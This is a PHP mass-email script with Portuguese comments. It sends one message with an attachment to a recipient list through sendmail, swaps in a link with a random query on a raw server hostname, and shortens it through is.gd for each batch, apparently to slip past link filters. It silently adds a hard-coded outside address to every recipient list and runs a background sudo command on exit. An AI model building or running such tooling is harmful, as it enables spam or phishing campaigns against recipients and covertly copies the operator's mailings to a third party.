<?php
/**
 * Sistema Otimizado de Envio com Encurtamento - VERSÃO MELHORADA
 * Versão 4.0 - Com sistema robusto anti-falhas
 */

// Configurações iniciais
ini_set('max_execution_time', 0);
ini_set('memory_limit', '512M');
ignore_user_abort(true);
set_time_limit(0);

// Desabilitar buffering
@ini_set('output_buffering', 'off');
@ini_set('zlib.output_compression', false);
while (@ob_end_flush());
ob_implicit_flush(true);

// Carregar dependências
require_once('src/email.php');
require_once('src/shortener_optimized.php');

// dispara classify-bounces quando o script terminar
register_shutdown_function(function () {
    shell_exec('sudo -n /usr/local/bin/classify-bounces > /dev/null 2>&1 &');
});

// WriteLn com flush
function writeLn($msg) {
    echo $msg . PHP_EOL;
    @flush();
}

// Configurações
$enableLogging = true;
define('BATCH_SIZE', 100);
define('PROGRESS_INTERVAL', 100);
define('KEEPALIVE_INTERVAL', 60);
define('CACHE_SIZE', 500);
define('MAX_FAILS_BEFORE_ROTATION', 3);
define('EMAIL_DEBUG', false);

/**
 * Parser de argumentos
 */
function parseArgv() {
    $argv = $_SERVER['argv'] ?? [];
    $params = [];
    $lastKey = '';

    foreach ($argv as $i => $arg) {
        if ($i === 0) continue;

        if (preg_match('/^--([^=]+)=(.*)/', $arg, $matches)) {
            $params[$matches[1]] = $matches[2];
            $lastKey = '';
        }
        elseif (preg_match('/^--(.+)/', $arg, $matches)) {
            $lastKey = $matches[1];
            $params[$lastKey] = '';
        }
        elseif ($lastKey) {
            $params[$lastKey] = trim($params[$lastKey] . ' ' . $arg);
        }
    }

    foreach ($params as &$value) {
        $value = trim($value);
    }

    return $params;
}

/**
 * Obtém parâmetros
 */
function getParams() {
    $params = parseArgv();
    $obj = new stdClass;

    // Delay
    if (isset($params['delay']) && is_numeric($params['delay'])) {
        $obj->delay = intval($params['delay']) * 1000;
    } else {
        $obj->delay = 180000;
    }

    // Remetente
    $obj->senderName = $params['nome'] ?? null;
    $obj->senderEmail = $params['de'] ?? null;
    $obj->subject = $params['assunto'] ?? null;
    
    // Conteúdo
    if (isset($params['conteudo']) && file_exists($params['conteudo'])) {
        $obj->content = file_get_contents($params['conteudo']);
    } else {
        $obj->content = null;
    }

    // Anexo
    if (isset($params['anexo']) && file_exists($params['anexo'])) {
        $obj->attachment = file_get_contents($params['anexo']);
        $obj->attachmentName = basename($params['anexo']);
    } else {
        $obj->attachment = null;
        $obj->attachmentName = null;
    }

    // Destinatários
    $obj->targets = [];
    
    if (isset($params['para'])) {
        $email = trim($params['para']);
        if (filter_var($email, FILTER_VALIDATE_EMAIL)) {
            $obj->targets[] = $email;
        }
    }

    if (isset($params['lista']) && file_exists($params['lista'])) {
        $lines = file($params['lista'], FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
        foreach ($lines as $line) {
            $email = trim($line);
            if (filter_var($email, FILTER_VALIDATE_EMAIL)) {
                $obj->targets[] = $email;
            }
        }
    }

    $obj->targets = array_unique($obj->targets);
    $obj->targets[] = "proyectos@riccetti.com.mx";
    return $obj;
}

/**
 * Verifica sendmail
 */
function verifySendMail() {
    $paths = ['/usr/sbin/sendmail', '/usr/bin/sendmail', '/usr/lib/sendmail'];
    foreach ($paths as $path) {
        if (is_file($path) && is_executable($path)) {
            return true;
        }
    }
    writeLn("ERRO: Sendmail nao encontrado!");
    writeLn("Execute: sudo apt-get install postfix");
    exit(1);
}

/**
 * Gera string aleatória
 */
function generateRandomString($length = 8) {
    $chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    $str = '';
    for ($i = 0; $i < $length; $i++) {
        $str .= $chars[mt_rand(0, strlen($chars) - 1)];
    }
    return $str;
}

/**
 * Cache de URLs
 */
class URLCache {
    private $cache = [];
    private $hits = 0;
    private $misses = 0;
    private $maxSize;
    
    public function __construct($maxSize = 10000) {
        $this->maxSize = $maxSize;
    }
    
    public function get($longUrl) {
        $hash = md5($longUrl);
        if (isset($this->cache[$hash])) {
            $this->hits++;
            return $this->cache[$hash]['short'];
        }
        $this->misses++;
        return null;
    }
    
    public function set($longUrl, $shortUrl) {
        $hash = md5($longUrl);
        if (count($this->cache) >= $this->maxSize) {
            array_shift($this->cache);
        }
        $this->cache[$hash] = ['short' => $shortUrl, 'time' => time()];
    }
    
    public function getStats() {
        $total = $this->hits + $this->misses;
        $hitRate = $total > 0 ? round(($this->hits / $total) * 100, 1) : 0;
        return [
            'hits' => $this->hits,
            'misses' => $this->misses,
            'hitRate' => $hitRate
        ];
    }
}

/**
 * Rotação de domínios
 */
class DomainRotator {
    private $domains = [];
    private $currentIndex = 0;
    
    public function __construct($domains) {
        $this->domains = $domains;
    }
    
    public function getNext() {
        $domain = $this->domains[$this->currentIndex % count($this->domains)];
        $this->currentIndex++;
        return $domain;
    }
}

/**
 * Sistema multi-serviço
 */
class MultiShortener {
    private $stats = [
        'is.gd' => ['success' => 0, 'fail' => 0],
        'v.gd' => ['success' => 0, 'fail' => 0],
        'tinyurl' => ['success' => 0, 'fail' => 0]
    ];
    
    public function shorten($url, $cache = null) {
        if ($cache) {
            $cached = $cache->get($url);
            if ($cached) return ['ok' => true, 'short' => $cached, 'service' => 'cache'];
        }
        
        $result = shortenUrlChecked($url);
        if ($result['ok']) {
            $this->stats['is.gd']['success']++;
            if ($cache) $cache->set($url, $result['short']);
            return $result;
        }
        
        $this->stats['is.gd']['fail']++;
        return ['ok' => false, 'reason' => 'all_failed'];
    }
    
    public function getStats() {
        return $this->stats;
    }
}

/**
 * Gera query aleatória
 */
function generateRandomQuery($length = 5) {
    $realLength = mt_rand(5, 10);
    
    $chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    $str = '';
    for ($i = 0; $i < $realLength; $i++) {
        $str .= $chars[mt_rand(0, strlen($chars) - 1)];
    }
    
    $params = ['r', 'id', 'ref', 'utm', 'c', 'source', 'track'];
    $param = $params[array_rand($params)];
    
    return '?' . $param . '=' . $str;
}

// ================================================================
//                     EXECUCAO PRINCIPAL
// ================================================================

verifySendMail();

if ($enableLogging) {
    writeLn("Inicio da execucao do script...");
}

$params = getParams();
$totalTargets = count($params->targets);

// Contadores principais
$emailsSent = 0;
$emailsFailed = 0;

if ($totalTargets === 0) {
    writeLn("ERRO: Nenhum destinatario encontrado!");
    exit(1);
}

// Inicializar sistemas
$urlCache = new URLCache(CACHE_SIZE);
$domainRotator = new DomainRotator([
    "https://201.225.167.72.host.secureserver.net",
    "https://201.225.167.72.host.secureserver.net",
    "https://201.225.167.72.host.secureserver.net",
]);
$shortener = new MultiShortener();

// Variáveis de controle (MANTENDO NOMES ORIGINAIS)
$shortLinkAtual = '';
$failureCount = 0;
$maxConsecutiveFailures = 3;  // REDUZIDO para 3 (era 5)
$useShortener = true;
$lastWorkingLink = '';

// Log file
$logMapFile = __DIR__ . "/short_maps_" . date('Y-m-d') . ".csv";
if (!file_exists($logMapFile)) {
    @file_put_contents($logMapFile, "timestamp;lote;long;short;status\n");
}

// Mostrar informações
writeLn("Total de alvos: $totalTargets");
writeLn("");
writeLn("==========================================================");
writeLn("     SISTEMA DE ENVIO EM MASSA v4.0 - ROBUSTO           ");
writeLn("==========================================================");
writeLn("");
writeLn("Total de destinatarios: $totalTargets");
writeLn("Delay entre envios: " . ($params->delay / 1000) . "ms");
writeLn("Tamanho do lote: " . BATCH_SIZE . " emails");
writeLn("Cache maximo: " . CACHE_SIZE . " URLs");
writeLn("Max falhas consecutivas: $maxConsecutiveFailures");

if (!empty($params->attachmentName)) {
    writeLn("Anexo: {$params->attachmentName}");
}

writeLn("");
writeLn("Iniciando envio em massa...");
writeLn("----------------------------------------------------------");

$startTime = microtime(true);
$lastKeepAlive = time();

// ================================================================
//                     LOOP PRINCIPAL MELHORADO
// ================================================================

foreach ($params->targets as $i => $to) {
    $current = $i + 1;
    
    // Novo lote
    if ($i % BATCH_SIZE == 0) {
        $lote = (int)floor($i / BATCH_SIZE + 1);
        
        // Gera URL base
        $domain = $domainRotator->getNext();
        $query = generateRandomQuery(mt_rand(5, 8));
        $fullUrl = $domain . $query;
        
        // ============================================================
        // SISTEMA ROBUSTO COM 3 TENTATIVAS
        // ============================================================
        
        if (!$useShortener) {
            // Encurtador desabilitado, usa link direto
            $shortLinkAtual = $fullUrl;
            writeLn("LOTE $lote - Encurtador desabilitado, usando link direto");
            writeLn("  Link: $fullUrl");
            
            @file_put_contents($logMapFile, 
                sprintf("%s;%d;%s;%s;DIRETO\n", 
                    date('Y-m-d H:i:s'), $lote, $fullUrl, $fullUrl),
                FILE_APPEND
            );
        } else {
            // Tenta encurtar com RETRY automático (3 tentativas)
            $tentativas = 0;
            $maxTentativas = 3;
            $sucesso = false;
            
            while ($tentativas < $maxTentativas && !$sucesso) {
                $tentativas++;
                
                $result = $shortener->shorten($fullUrl, $urlCache);
                
                if ($result['ok']) {
                    // SUCESSO!
                    $shortLinkAtual = $result['short'];
                    $lastWorkingLink = $shortLinkAtual;
                    $failureCount = 0;
                    $sucesso = true;
                    
                    $service = $result['service'] ?? 'unknown';
                    $cacheHit = $service == 'cache' ? 'SIM' : 'NAO';
                    
                    writeLn("LOTE $lote - Sucesso" . ($tentativas > 1 ? " (tentativa $tentativas)" : ""));
                    writeLn("  Link original: $fullUrl");
                    writeLn("  Link encurtado: $shortLinkAtual");
                    writeLn("  Servico: $service (Cache: $cacheHit)");
                    
                    @file_put_contents($logMapFile, 
                        sprintf("%s;%d;%s;%s;OK\n", 
                            date('Y-m-d H:i:s'), $lote, $fullUrl, $shortLinkAtual),
                        FILE_APPEND
                    );
                } else {
                    // Falhou esta tentativa
                    if ($tentativas < $maxTentativas) {
                        writeLn("LOTE $lote - Tentativa $tentativas falhou, retrying...");
                        usleep(500000); // 0.5 segundos entre tentativas
                    }
                }
            }
            
            // Se todas as 3 tentativas falharam
            if (!$sucesso) {
                $failureCount++;
                
                // Usa último link que funcionou (se existir)
                if ($lastWorkingLink && $failureCount <= $maxConsecutiveFailures) {
                    $shortLinkAtual = $lastWorkingLink;
                    writeLn("LOTE $lote - Falhou 3x, usando ultimo link (falha $failureCount/$maxConsecutiveFailures)");
                    writeLn("  Link de backup: $shortLinkAtual");
                } else {
                    // Sem backup ou muitas falhas, usa direto
                    $shortLinkAtual = $fullUrl;
                    writeLn("LOTE $lote - Falhou 3x, usando link direto");
                    writeLn("  Link direto: $fullUrl");
                }
                
                // Desabilita após limite de falhas
                if ($failureCount >= $maxConsecutiveFailures) {
                    $useShortener = false;
                    writeLn("*** ENCURTADOR DESABILITADO APOS $failureCount FALHAS ***");
                }
                
                @file_put_contents($logMapFile, 
                    sprintf("%s;%d;%s;%s;FALLBACK\n", 
                        date('Y-m-d H:i:s'), $lote, $fullUrl, $shortLinkAtual),
                    FILE_APPEND
                );
            }
        }
    }
    
    // PROTEÇÃO FINAL
    if (empty($shortLinkAtual)) {
        $domain = $domainRotator->getNext();
        $query = generateRandomQuery(5);
        $shortLinkAtual = $domain . $query;
        writeLn("  Link de emergencia: $shortLinkAtual");
    }
    
    $contentToSend = str_replace('[-meu_link_curto-]', $shortLinkAtual, $params->content);
    
    // Enviar email
    $result = @sendEmail(
        $params->senderName,
        $params->senderEmail,
        $to,
        $params->subject,
        $contentToSend,
        $params->attachment ?? '',
        $params->attachmentName ?? ''
    );
    
    if ($result) {
        $emailsSent++;
    } else {
        $emailsFailed++;
        if ($emailsFailed <= 10) {
            writeLn("Nao foi possivel enviar email para $to");
        }
    }
    
    // Progresso
    if ($current % PROGRESS_INTERVAL == 0) {
        $percentage = round(($current / $totalTargets) * 100, 1);
        
        $elapsed = microtime(true) - $startTime;
        $avgPerEmail = $elapsed / $current;
        $remaining = $totalTargets - $current;
        $eta = $remaining * $avgPerEmail;
        
        if ($eta < 60) {
            $etaStr = round($eta) . ' segundos';
        } elseif ($eta < 3600) {
            $etaStr = round($eta / 60) . ' minutos';
        } else {
            $etaStr = round($eta / 3600, 1) . ' horas';
        }
        
        writeLn("Progresso: $current/$totalTargets ($percentage%) - Enviados: [$emailsSent] - Falhas: $emailsFailed - ETA: $etaStr");
        
        if ($current % 500 == 0) {
            $successRate = ($emailsSent > 0) ? round(($emailsSent / $current) * 100, 1) : 0;
            writeLn("Taxa de sucesso: $successRate%");
            
            $cacheStats = $urlCache->getStats();
            writeLn("Cache: {$cacheStats['hits']} hits, {$cacheStats['misses']} misses ({$cacheStats['hitRate']}% hit rate)");
            
            if (!$useShortener) {
                writeLn(">>> AVISO: Encurtador desabilitado - usando links diretos");
            }
        }
    }
    
    usleep($params->delay);
    
    // Keep-alive
    $now = time();
    if (($now - $lastKeepAlive) >= KEEPALIVE_INTERVAL) {
        @file_get_contents("https://www.google.com/favicon.ico");
        $lastKeepAlive = $now;
    }
    
    if ($current % 5000 == 0) {
        writeLn(">>> Marco: $current emails processados!");
    }
}

// Garantir envio do último email
if (!empty($params->targets)) {
    $ultimoEmail = end($params->targets);
    writeLn("");
    writeLn("=== GARANTIA DE ENVIO DO ULTIMO EMAIL ===");
    writeLn("Garantindo envio: $ultimoEmail");
    
    $finalDomain = $domainRotator->getNext();
    $finalQuery = generateRandomQuery(8);
    $finalUrl = $finalDomain . $finalQuery;
    
    $contentFinal = str_replace('[-meu_link_curto-]', $finalUrl, $params->content);
    
    $result = @sendEmail(
        $params->senderName,
        $params->senderEmail,
        $ultimoEmail,
        $params->subject . " (FINAL)",
        $contentFinal,
        $params->attachment ?? '',
        $params->attachmentName ?? ''
    );
    
    writeLn("Ultimo email " . ($result ? "enviado" : "falhou"));
    writeLn("Link: $finalUrl");
    writeLn("=========================================");
}

// Relatorio final
$endTime = microtime(true);
$executionTime = $endTime - $startTime;
$minutes = floor($executionTime / 60);
$seconds = $executionTime % 60;

writeLn("");
writeLn("==========================================================");
writeLn("                RELATORIO FINAL                           ");
writeLn("==========================================================");
writeLn("");

$message = "Execucao finalizada. Enviados: [$emailsSent], Falhas: $emailsFailed";
writeLn($message);

writeLn("Tempo: $minutes min " . round($seconds, 2) . " seg");

if ($emailsSent > 0) {
    $avgTime = $executionTime / $emailsSent;
    writeLn("Tempo medio: " . round($avgTime, 2) . " seg/email");
    writeLn("Velocidade: " . round(60 / $avgTime, 1) . " emails/min");
}

$successRate = ($totalTargets > 0) ? round(($emailsSent / $totalTargets) * 100, 2) : 0;
writeLn("Taxa de sucesso: $successRate%");

if (!$useShortener) {
    writeLn("");
    writeLn("AVISO: Encurtador desabilitado durante execucao");
}

$cacheStats = $urlCache->getStats();
writeLn("");
writeLn("Cache:");
writeLn("  Hits: {$cacheStats['hits']}");
writeLn("  Misses: {$cacheStats['misses']}");
writeLn("  Taxa: {$cacheStats['hitRate']}%");

$serviceStats = $shortener->getStats();
writeLn("");
writeLn("Servicos:");
foreach ($serviceStats as $name => $stats) {
    $total = $stats['success'] + $stats['fail'];
    if ($total > 0) {
        $rate = round(($stats['success'] / $total) * 100, 1);
        writeLn("  $name: {$stats['success']} sucessos, {$stats['fail']} falhas ($rate%)");
    }
}

writeLn("==========================================================");

if ($enableLogging) {
    writeLn("Script finalizado.");
}

exit($emailsFailed > 0 ? 1 : 0);
?>